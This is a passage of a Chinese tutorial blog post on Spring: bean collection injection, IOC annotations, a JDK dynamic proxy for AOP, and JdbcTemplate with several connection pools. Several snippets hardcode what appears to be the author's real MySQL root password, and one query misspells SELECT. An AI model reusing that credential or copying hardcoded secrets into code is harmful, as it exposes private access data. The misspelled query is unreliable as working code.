<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"attr"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>zs<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>ls<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>ww<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>List的bean中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--list--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"myList"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>123<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>456<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Map的bean中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--map--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"myMap"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"ke1"</span> <span class="attr">value</span>=<span class="string">"value1"</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"ke2"</span> <span class="attr">value</span>=<span class="string">"value2"</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">entry</span> <span class="attr">key</span>=<span class="string">"ke3"</span> <span class="attr">value</span>=<span class="string">"value3"</span>&gt;</span><span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>Set的bean中配置</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--set--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"mySet"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>000<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>111<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">property</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="IOC注解方式"><a href="#IOC注解方式" class="headerlink" title="IOC注解方式"></a>IOC注解方式</h2><ol><li><p>在spring4之后，想要使用注解形式，必须得要引入aop的包</p></li><li><p>在配置文件当中，还得要引入一个context约束</p></li><li><p>配置组件扫描，指定在哪个包下扫描</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">"com.cauc"</span>/&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>在类的开头添加注解，表示将这个类交给Spring来管理</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span>(<span class="string">"dog"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"WC"</span>)</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果提供了set方法，在set方法上添加@value(“值”);</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Component</span>(<span class="string">"dog"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"WC"</span>)</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="IOC注解详解"><a href="#IOC注解详解" class="headerlink" title="IOC注解详解"></a>IOC注解详解</h2><ol><li><p><code>@Component</code>：修改一个类，将这个类交给Spring管理  相当于在配置文件当中配置<bean id class></bean></p></li><li><p><code>@Component</code>三个衍生注解：为了更好的进行分层，Spring可以使用其它三个注解，功能类似，目前使用哪一个功能都一样， 后期可能会添加一些属于各自的属性</p><ul><li><code>@Controller</code>：web层</li><li><code>@Service</code>：service层</li><li><code>@Repository</code>：dao层</li></ul></li><li><p>属性注入：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//IOC</span></span><br><span class="line"><span class="meta">@Component</span>(<span class="string">"user"</span>)</span><br><span class="line"><span class="comment">//单例/实例</span></span><br><span class="line"><span class="meta">@Scope</span>(<span class="string">"prototype"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="comment">//变量注入</span></span><br><span class="line">    <span class="meta">@Value</span>(<span class="string">"潘星波"</span>)</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line"><span class="comment">//    @Autowired/*根据类型注入*/</span></span><br><span class="line"><span class="comment">//    @Qualifier("dog")/*根据名称注入*/</span></span><br><span class="line">    <span class="meta">@Resource</span>(name=<span class="string">"dog"</span>)</span><br><span class="line">    <span class="keyword">public</span> Dog dog;</span><br><span class="line">    <span class="comment">//初始化执行</span></span><br><span class="line">    <span class="meta">@PostConstruct</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"init---初始化"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//销毁执行</span></span><br><span class="line">    <span class="meta">@PreDestroy</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"destroy---销毁"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>XML与注解比较</p><ul><li>XML可以适用任何场景 ，结构清晰，维护方便</li><li>注解不是自己提供的类使用不了，开发简单方便</li></ul></li><li><p>XML与注解整合开发</p><ul><li>XML管理Bean</li><li>注解完成属性注入</li><li>使用过程中， 可以不用扫描，扫描是为了类上的注解</li><li>在没有扫描的情况下， 使用属性注解<code>@Resource</code> <code>@Value</code> <code>@Autowired</code> <code>@Qulifier</code></li></ul></li></ol><h2 id="AOP"><a href="#AOP" class="headerlink" title="AOP"></a>AOP</h2><ol><li><p>AOP简介：</p><p>在软件业，AOP为Aspect Oriented Programming的缩写，意为：面向切面编程，<br>通过预编译方式和运行期动态代理实现程序功能的统一维护的一种技术。和python的装饰器有相似之处。</p></li><li><p>JDK动态代理（有接口的情况下）</p><p>当我们想给类增加或者删除功能，可以使用动态代理的方式，这样可以不用频繁的改动代码。类似python的装饰器</p><p>定义一个接口</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">GoodsDao</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义接口的实现类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GoodsDaoImpl</span> <span class="keyword">implements</span> <span class="title">GoodsDao</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"保存操作"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"更新"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>定义测试类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GoodsDaoTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        GoodsDao goodsDao = <span class="keyword">new</span> GoodsDaoImpl();</span><br><span class="line">        goodsDao.save();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假如此时需要修改功能，比如增加校验功能，我们需要修改许多代码，这时我们使用面向AOP编程，即使用JDK动态代理，使用步骤如下</p><ul><li><p>定义一个代理类</p><p>其中方法接收一个代理的对象，并返回经过功能强化后的对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GoodsJDKProxy</span> </span>&#123;</span><br><span class="line">    <span class="comment">//接收待强化功能的对象</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> GoodsDao <span class="title">createProxy</span><span class="params">(GoodsDao goodsDao)</span></span>&#123;</span><br><span class="line">        <span class="comment">//增强</span></span><br><span class="line">        GoodsDao goodsDaoProxy = (GoodsDao) Proxy.newProxyInstance(goodsDao.getClass().getClassLoader(), goodsDao.getClass().getInterfaces(), </span><br><span class="line">            <span class="keyword">new</span> InvocationHandler() &#123;</span><br><span class="line">            <span class="meta">@Override</span><span class="comment">/*当调用对象的时候，所有的方法都会来到这里*/</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">"save"</span>.equals(method.getName()))&#123;</span><br><span class="line">                    System.out.println(<span class="string">"权限校验"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">return</span> method.invoke(goodsDao,args);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="keyword">return</span> goodsDaoProxy;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Proxy.newProxyInstance</code>方法:</p><p>第一个参数：通过获取对象字节码的方式，加载对象</p><p>第二个参数：获取对象的接口</p><p>第三个参数：一个回调函数，对每个该对象的方法被调用的时候都为来到这里是增强功能的关键</p></li><li><p>测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">GoodsDaoTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        GoodsDao goodsDao = <span class="keyword">new</span> GoodsDaoImpl();</span><br><span class="line">        <span class="comment">//创建自定义的代理类</span></span><br><span class="line">        GoodsJDKProxy goodsJDKProxy = <span class="keyword">new</span> GoodsJDKProxy();</span><br><span class="line">        <span class="comment">//获取的代理对象</span></span><br><span class="line">        GoodsDao proxy = goodsJDKProxy.createProxy(goodsDao);</span><br><span class="line">        proxy.save();</span><br><span class="line">        proxy.update();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li></ol><h2 id="SpringJDBC-Template"><a href="#SpringJDBC-Template" class="headerlink" title="SpringJDBC-Template"></a>SpringJDBC-Template</h2><ul><li><p>JDBC连接数据</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//jdbc连接数据库</span></span><br><span class="line">   <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringJdbcTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">       <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//创建连接池（数据库相关信息）</span></span><br><span class="line">           DriverManagerDataSource dataSource = <span class="keyword">new</span> DriverManagerDataSource();</span><br><span class="line">        <span class="comment">//使用哪种连接池，提供对应的驱动</span></span><br><span class="line">           dataSource.setDriverClass(<span class="string">"com.mysql.jdbc.Driver"</span>);</span><br><span class="line">        <span class="comment">//数据库路径</span></span><br><span class="line">           dataSource.setJdbcUrl(<span class="string">"jdbc:mysql:///spring?useUnicode=true&amp;characterEncoding=utf8"</span>);</span><br><span class="line">        <span class="comment">//用户名和密码</span></span><br><span class="line">           dataSource.setUser(<span class="string">"root"</span>);</span><br><span class="line">           dataSource.setPassword(<span class="string">"pxb19990108"</span>);</span><br><span class="line">   </span><br><span class="line">           <span class="comment">//创建jdbc的模板</span></span><br><span class="line">           JdbcTemplate jdbcTemplate = <span class="keyword">new</span> JdbcTemplate(dataSource);</span><br><span class="line">           <span class="comment">//数据库操作</span></span><br><span class="line">           jdbcTemplate.update(<span class="string">"insert into account values (null,?,?)"</span>,<span class="string">"pxb"</span>,<span class="number">1000</span>);</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>Spring模板连接数据库</p><ol><li>文件配置及注入</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"datasource"</span> <span class="attr">class</span>=<span class="string">"com.mchange.v2.c3p0.DriverManagerDataSource"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClass"</span> <span class="attr">value</span>=<span class="string">"com.mysql.jdbc.Driver"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"jdbcUrl"</span> <span class="attr">value</span>=<span class="string">"jdbc:mysql:///spring?useUnicode=true&amp;amp;characterEncoding=utf8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"****"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"user"</span> <span class="attr">value</span>=<span class="string">"root"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"jdbcTemplate"</span> <span class="attr">class</span>=<span class="string">"org.springframework.jdbc.core.JdbcTemplate"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"dataSource"</span> <span class="attr">ref</span>=<span class="string">"datasource"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ul><pre><code>2. 代码</code></pre>   <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//使用JDBC改写模板</span></span><br><span class="line"><span class="meta">@RunWith</span>(SpringJUnit4ClassRunner.class)</span><br><span class="line"><span class="meta">@ContextConfiguration</span>(<span class="string">"classpath:applicationContext.xml"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SpringJdbc2</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Resource</span>(name = <span class="string">"jdbcTemplate"</span>)</span><br><span class="line">    <span class="keyword">private</span> JdbcTemplate jdbcTemplate;</span><br><span class="line"></span><br><span class="line">   <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span>&#123;</span><br><span class="line">       jdbcTemplate.update(<span class="string">"insert into account values (null,?,?)"</span>,<span class="string">"pxb2"</span>,<span class="number">1000</span>);</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li><p>使用第三方连接池，只需要引入对应的jar包，更改对应的属性名称即可——dbcp连接池</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--dbcp连接池--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"dbcp"</span> <span class="attr">class</span>=<span class="string">"org.apache.commons.dbcp.BasicDataSource"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClassName"</span> <span class="attr">value</span>=<span class="string">"com.mysql.jdbc.Driver"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"jdbc:mysql:///spring?useUnicode=true&amp;amp;characterEncoding=utf8"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"pxb19990108"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"root"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><ol start="4"><li><p>通过配置文件+bean完成连接池的创建</p><p><code>jdbc.properties</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">driverClassName = com.mysql.jdbc.Driver</span><br><span class="line">url = jdbc:mysql:///spring?useUnicode=true&amp;characterEncoding=utf8</span><br><span class="line">password = pxb19990108</span><br><span class="line">username = root</span><br></pre></td></tr></table></figure></li></ol>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--druid连接池--&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"druid"</span> <span class="attr">class</span>=<span class="string">"com.alibaba.druid.pool.DruidDataSource"</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClassName"</span> <span class="attr">value</span>=<span class="string">"$&#123;driverClassName&#125;"</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"$&#123;url&#125;"</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;password&#125;"</span>/&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"$&#123;username&#125;"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="5"><li><p>通过配置文件+context标签完成连接池的创建</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">context:property-placeholder</span> <span class="attr">location</span>=<span class="string">"classpath:jdbc.properties"</span>/&gt;</span></span><br></pre></td></tr></table></figure></li></ol>   <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--druid连接池--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">"druid"</span> <span class="attr">class</span>=<span class="string">"com.alibaba.druid.pool.DruidDataSource"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"driverClassName"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.driverClassName&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"url"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.url&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"password"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.password&#125;"</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">"username"</span> <span class="attr">value</span>=<span class="string">"$&#123;jdbc.username&#125;"</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   问题：通过配置文件加载后更新操作为何一直卡住没反应</p><ul><li><p>CURD操作</p><ol><li>插入</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">insert</span><span class="params">()</span></span>&#123;</span><br><span class="line">       System.out.println(<span class="string">"运行到1"</span>);</span><br><span class="line">       jdbcTemplate.update(<span class="string">"insert into account values (null,?,?)"</span>,<span class="string">"pxb5"</span>,<span class="number">1000</span>);</span><br><span class="line">       System.out.println(<span class="string">"运行到2"</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></li></ul><pre><code>1. 删除<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">delete</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"运行到1"</span>);</span><br><span class="line">        jdbcTemplate.update(<span class="string">"delete from account where id = ?"</span>,<span class="number">2</span>);</span><br><span class="line">        System.out.println(<span class="string">"运行到2"</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>3. 查找<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">select</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"运行到1"</span>);</span><br><span class="line">        String name = jdbcTemplate.queryForObject(<span class="string">"selec name from account where id = ?"</span>,String.class,<span class="number">1</span>);</span><br><span class="line">        System.out.println(name);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>4. 查询对象<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">queryAccount</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="comment">//查询单个对象</span></span><br><span class="line">       Account account = jdbcTemplate.queryForObject(<span class="string">"select * from account where id =?"</span>,<span class="keyword">new</span> MyRowMap(),<span class="number">1</span>);</span><br><span class="line">        System.out.println();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 